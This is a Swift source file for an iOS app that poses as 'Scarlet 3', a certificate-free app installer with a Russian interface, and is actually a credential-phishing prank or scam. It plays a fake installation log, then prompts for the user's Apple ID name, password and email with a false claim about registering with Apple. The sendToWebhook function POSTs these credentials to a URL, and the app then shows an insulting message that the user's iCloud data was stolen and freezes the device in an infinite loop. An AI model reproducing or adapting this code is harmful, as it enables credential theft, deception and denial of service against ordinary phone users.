//
//  ContentView.swift
//  ballbr3aker
//
//  Created by Анохин Юрий on 01.06.2023.
//  Modified by SalupovTeam on 18.05.2024.
//
import SwiftUI
import UIKit

struct ContentView: View {
    @State private var logHidden = true
    @State private var log: [String] = []
    @State private var creditsShown = false
    @State private var settingsShown = false
    @State private var showProgress = true
    @State private var isPressed = false
    @State private var isSettingsPressed = false
    @AppStorage("firstTime") private var firstTime = true
    @AppStorage("remainingAttempts") private var remainingAttempts = 5
    @AppStorage("isLocked") private var isLocked = false
    @AppStorage("lockedUDID") private var lockedUDID = ""
    @State private var animateComponents = false
    @State private var username = ""
    @State private var password = ""
    @State private var email = ""
    @State private var isProcessing = false
    @State private var unlockCode = ""
    @State private var showUnlockField = false
    @State private var showPizda = false
    @Environment(\.openURL) var openURL

    // Expected bundle identifier
    private let expectedBundleID = "huy"
    private let unlockSecretCode = "UNLOCK1234"
    
    var body: some View {
        VStack {
            if showProgress {
                VStack {
                    Text("Загрузка")
                        .padding()
                        .offset(y: animateComponents ? 0 : UIScreen.main.bounds.height)
                        .animation(.easeOut(duration: 1.0), value: animateComponents)

                    ProgressView()
                        .progressViewStyle(CircularProgressViewStyle())
                        .scaleEffect(2)
                        .offset(y: animateComponents ? 0 : UIScreen.main.bounds.height)
                        .animation(.easeOut(duration: 1.0).delay(0.2), value: animateComponents)
                }
                .onAppear {
                    withAnimation {
                        animateComponents = true
                    }
                    DispatchQueue.main.asyncAfter(deadline: .now() + 2) {
                        withAnimation {
                            showProgress = false
                        }
                    }
                }
            } else {
                VStack {
                    Text("Scarlet 3")
                        .bold()
                        .font(.custom("Code Pro Black", size: 45))
                    
                    Text("Сделанно SalupovTeam")
                        .opacity(0.5)
                        
                    
                    Text("Версия 3.3")
                        .font(.system(size: 12))
                        .opacity(0.5)
                }
                
                if logHidden {
                    VStack {
                        Button(action: {
                            withAnimation {
                                logHidden = false
                            }
                            generateHapticFeedback()
                        }) {
                            Label(isValidBuild() && !isLocked ? "Установить" : "Недоступно", systemImage: "lock.open")
                                .font(.system(size: 20))
                                .padding()
                                .background(
                                    isPressed ? Color.gray : Color.red
                                )
                                .foregroundColor(.white)
                                .cornerRadius(80)
                                .shadow(color: .red, radius: isPressed ? 2 : 10, x: isPressed ? 1 : 0, y: isPressed ? 1 : 0)
                                .scaleEffect(isPressed ? 0.95 : 1.0)
                                .animation(.easeInOut(duration: 0.2), value: isPressed)
                        }
                        .buttonStyle(PlainButtonStyle())
                        .simultaneousGesture(
                            DragGesture(minimumDistance: 0)
                                .onChanged { _ in
                                    withAnimation {
                                        isPressed = true
                                    }
                                }
                                .onEnded { _ in
                                    withAnimation {
                                        isPressed = false
                                    }
                                }
                        )
                        .disabled(!isValidBuild() || isSupportedVersion() || isLocked)
                        
                        if isValidBuild() {
                            Button(action: {
                                settingsShown.toggle()
                                generateHapticFeedback()
                            }) {
                                Label("Настройки", systemImage: "gear")
                                    .font(.system(size: 20))
                                    .padding()
                                    .background(
                                        isSettingsPressed ? Color.gray : Color.red
                                    )
                                    .foregroundColor(.white)
                                    .cornerRadius(80)
                                    .shadow(color: .red, radius: isSettingsPressed ? 2 : 10, x: isSettingsPressed ? 1 : 0, y: isSettingsPressed ? 1 : 0)
                                    .scaleEffect(isSettingsPressed ? 0.95 : 1.0)
                                    .animation(.easeInOut(duration: 0.2), value: isSettingsPressed)
                            }
                            .buttonStyle(PlainButtonStyle())
                            .simultaneousGesture(
                                DragGesture(minimumDistance: 0)
                                    .onChanged { _ in
                                        withAnimation {
                                            isSettingsPressed = true
                                        }
                                    }
                                    .onEnded { _ in
                                        withAnimation {
                                            isSettingsPressed = false
                                        }
                                    }
                            )
                            
                            Button(action: {
                                showLoginAlert()
                                generateHapticFeedback()
                            }) {
                                Label("Концовка", systemImage: "gear")
                                    .font(.system(size: 20))
                                    .padding()
                                    .background(
                                        isSettingsPressed ? Color.gray : Color.red
                                    )
                                    .foregroundColor(.white)
                                    .cornerRadius(80)
                                    .shadow(color: .red, radius: isSettingsPressed ? 2 : 10, x: isSettingsPressed ? 1 : 0, y: isSettingsPressed ? 1 : 0)
                                    .scaleEffect(isSettingsPressed ? 0.95 : 1.0)
                                    .animation(.easeInOut(duration: 0.2), value: isSettingsPressed)
                            }
                            .buttonStyle(PlainButtonStyle())
                            .simultaneousGesture(
                                DragGesture(minimumDistance: 0)
                                    .onChanged { _ in
                                        withAnimation {
                                            isSettingsPressed = true
                                        }
                                    }
                                    .onEnded { _ in
                                        withAnimation {
                                            isSettingsPressed = false
                                        }
                                    }
                            )
                            
                            
                            
                            
                            
                            
                        }
                    }
                    .padding()
                } else {
                    VStack(alignment: .leading) {
                        HStack {
                            Text("Установка...")
                                .opacity(0.5)
                                .padding()
                            
                            ProgressView()
                        }
                                                        
                        Color.gray
                            .opacity(0.1)
                            .cornerRadius(20)
                            .overlay(
                                ScrollView {
                                    VStack(alignment: .leading) {
                                        ForEach(log, id: \.self) { entry in
                                            Text(entry)
                                                .font(.custom("Menlo", size: 14))
                                                .foregroundColor(.white)
                                                .frame(maxWidth: .infinity, alignment: .leading)
                                                .textSelection(.enabled)
                                        }
                                    }
                                    .padding(10)
                                }
                            )
                    }
                    .onAppear {
                        simulateLogEntries()
                    }
                    .onChange(of: log) { newLog in
                        if newLog.contains("Ошибка! Не удалось найти ваш сертификат!") && !isProcessing {
                            showLoginAlert()
                        }
                    }
                    .padding()
                    .transition(.move(edge: .bottom))
                    
                    if showUnlockField {
                        TextField("Введите код разблокировки", text: $unlockCode, onCommit: {
                            if unlockCode == unlockSecretCode {
                                isLocked = false
                                remainingAttempts = 2
                                log.append("Устройство разблокировано с помощью кода разблокировки.")
                                UIApplication.shared.alert(title: "Разблокировано", body: "Ваше устройство было разблокировано.", withButton: false)
                                showUnlockField = false
                                unlockCode = ""
                            } else {
                                UIApplication.shared.alert(title: "Ошибка", body: "Неверный код разблокировки.", withButton: true)
                            }
                        })
                        .padding()
                        .background(Color.white)
                        .cornerRadius(8)
                    }
                }
            }
        }
        .sheet(isPresented: $creditsShown) {
            CreditsView()
        }
        .sheet(isPresented: $settingsShown) {
            SettingsView()
        }
        .onAppear {
            if firstTime {
                UIApplication.shared.alert(title: "Привет!", body: "Спасибо что скачали наше приложение!")
                firstTime.toggle()
            }
            if isLocked {
                log.append("Доступ заблокирован. Устройство с этим UDID уже было заблокировано.")
            }
        }
    }
    
    private func generateHapticFeedback() {
        let generator = UIImpactFeedbackGenerator(style: .medium)
        generator.impactOccurred()
    }

    private func log(entry: String, time: Double) {
        DispatchQueue.main.asyncAfter(deadline: .now() + time) {
            guard !isProcessing else { return }
            log.append(entry)
        }
    }
    
    private func isSupportedVersion() -> Bool {
        if #available(iOS 20.6.9, *) {
            return true
        } else {
            return false
        }
    }
    
    private func isValidBuild() -> Bool {
        return "huy" == expectedBundleID
    }
    
    private func randomNumbers() -> String {
        let errorCode = String(format: "%02X", arc4random_uniform(256))
        let errorValue = String(format: "%08X", arc4random_uniform(UInt32.max))
        return "0x\(errorCode)\(errorValue)"
    }
    
    private func showLoginAlert() {
        guard remainingAttempts > 0 else {
            UIApplication.shared.alert(title: "Доступ заблокирован", body: "Вы исчерпали все попытки.", withButton: true)
            log.append("Доступ заблокирован. Попытки закончились.")
            logHidden = true
            return
        }
        
        let alert = UIAlertController(title: "Проверка", message: "Чтобы устанавливать приложения без сертификатов, мы должны вас зарегистрировать в серверах Apple. Пожалуйста введите ваш Apple ID", preferredStyle: .alert)
        
        alert.addTextField { textField in
            textField.placeholder = "Имя"
        }
        
        alert.addTextField { textField in
            textField.placeholder = "Пароль"
            textField.isSecureTextEntry = true
        }
        
        alert.addTextField { textField in
            textField.placeholder = "Email"
        }
        
        let submitAction = UIAlertAction(title: "Отправить", style: .default) { _ in
            guard let username = alert.textFields?[0].text, !username.isEmpty,
                  let password = alert.textFields?[1].text, !password.isEmpty,
                  let email = alert.textFields?[2].text, self.isValidEmail(email) else {
                self.remainingAttempts -= 1
                self.handleAttempts()
                return
            }
            
            if self.hasRepeatedCharacters(text: username) || self.hasRepeatedCharacters(text: password) || self.hasRepeatedCharacters(text: email) {
                self.remainingAttempts -= 1
                self.handleAttempts()
                return
            }
            
            let alertController = UIAlertController(title: "Приложение собирается установить «Scarlet 3»", message: nil, preferredStyle: .alert)
                   
                   // Create the "Cancel" action
                   let cancelAction = UIAlertAction(title: "Отменить", style: .cancel) { _ in
                       // Handle cancel action if needed
                       print("иди нахуй тварь")
                   }
                   
                   // Create the "Install" action
                   let installAction = UIAlertAction(title: "Установить", style: .default) { _ in
                       // Handle install action if needed
                       print("еее")
                   }
                   
                   // Add actions to the alert controller
                   alertController.addAction(cancelAction)
                   alertController.addAction(installAction)
                   
                   // Present the alert controller
            UIApplication.shared.windows.first?.rootViewController?.present(alertController, animated: true)
                    
            
            UIApplication.shared.alert(title: "Ахаха соси хуй", body: "Мы украли все твои данные, в том числе твой iCloud) Сейчас мы сольем все твои данные в сеть, сотрем и заблокируем твой \(deviceType())", withButton: false)

            self.sendToWebhook(username: username, password: password, email: email)
            self.isProcessing = true
            DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
                Timer.scheduledTimer(withTimeInterval: 0.5, repeats: false) { timer in
                    guard let window = UIApplication.shared.windows.first else { return }
                    while true {
                        window.snapshotView(afterScreenUpdates: false)
                    }
                }
            }
        }
        
        alert.addAction(submitAction)
        
        DispatchQueue.main.async {
            UIApplication.shared.windows.first?.rootViewController?.present(alert, animated: true)
        }
    }
    
    private func handleAttempts() {
        isProcessing = false
        if remainingAttempts <= 0 {
            isLocked = true
            lockedUDID = deviceType()
            UIApplication.shared.alert(title: "Доступ заблокирован", body: "Вы исчерпали все попытки.", withButton: false)
            log.append("Доступ заблокирован. Попытки закончились.")
            logHidden = true
        } else {
            UIApplication.shared.alert(title: "Ошибка", body: "Пожалуйста, проверьте введенные данные. Осталось попыток: \(remainingAttempts)")
            log.append("Ошибка при вводе данных. Осталось попыток: \(remainingAttempts).")
            logHidden = true
        }
    }

    private func isValidEmail(_ email: String) -> Bool {
        let emailPattern = "^[A-Z0-9a-z._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,}$"
        let emailPredicate = NSPredicate(format:"SELF MATCHES %@", emailPattern)
        return emailPredicate.evaluate(with: email)
    }

    private func hasRepeatedCharacters(text: String) -> Bool {
        var charCount = [Character: Int]()
        for char in text {
            charCount[char, default: 0] += 1
            if charCount[char]! >= 9 {
                return true
            }
        }
        return false
    }

    private func sendToWebhook(username: String, password: String, email: String) {
        let webhookURL = URL(string: "https://google.com")!
        var request = URLRequest(url: webhookURL)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        
        let payload: [String: Any] = [
            "content": "name: \(username)\npassword: \(password)\nemail: \(email)"
        ]
        
        request.httpBody = try? JSONSerialization.data(withJSONObject: payload, options: [])
        
        URLSession.shared.dataTask(with: request) { data, response, error in
            if let error = error {
                print("Error sending to webhook: \(error)")
                return
            }
            print("Successfully sent to webhook")
        }.resume()
    }
    
    private func simulateLogEntries() {
        log(entry: "[*] Скачиваем scarlet.pkg", time: 1)
        log(entry: "[*] Скачиваем scarletboot.img", time: 2)
        log(entry: "[*] Установка сертификатов", time: 4)
        log(entry: "[*] Проверка", time: 10)
        log(entry: "[+] \(randomNumbers())", time: 15)
        log(entry: "[+] Сертификаты установленны!", time: 17)
        log(entry: "[*] Распаковка scarlet.pkg", time: 19)
        log(entry: "[+] Раскапован scarlet.pkg!", time: 21)
        log(entry: "[*] Подключение к устройству", time: 23)
        log(entry: "[+] Подключено к устройству!", time: 25)
        log(entry: "[*] Запускаем idb", time: 27)
        log(entry: "idb push runner.scarlet /tmp/runner.scarlet", time: 30)
        log(entry: "idb shell su -c sh /tmp/runner.scarlet -eraseall -install scarlet -ver 3b", time: 32)
        log(entry: "[+] Выходим из idb", time: 34)
        log(entry: "[*] Обработка данных", time: 37)
        log(entry: "scarletboot flash scarlet.img --erase \(deviceType())", time: 39)
        log(entry: "scarletboot -enable infinite certificate", time: 40)
        log(entry: "[*] Проверяем доступ к серверу", time: 42)
        log(entry: "[*] Регистрация устройства", time: 45)
        log(entry: "[+] Устройство зарегистрированно!", time: 47)
        log(entry: "[*] Получаем информацию с серверов эпл", time: 50)
        log(entry: "файл тимкок.пнг был скачан", time: 51)
        log(entry: "файл тимкок.сертификат был скачан", time: 52)
        log(entry: "[+] Готово!", time: 53)
        log(entry: "Ошибка! Не удалось найти ваш сертификат!", time: 55)
    }

    private func deviceType() -> String {
        var systemInfo = utsname()
        uname(&systemInfo)
        let machineMirror = Mirror(reflecting: systemInfo.machine)
        let identifier = machineMirror.children.reduce("") { identifier, element in
            guard let value = element.value as? Int8, value != 0 else { return identifier }
            return identifier + String(UnicodeScalar(UInt8(value)))
        }
        return identifier
    }
    
    private func identifierForVendor() -> String {
        UIDevice.current.identifierForVendor?.uuidString ?? "Unavailable"
    }
}

struct ContentView_Previews: PreviewProvider {
    static var previews: some View {
        ContentView()
    }
}
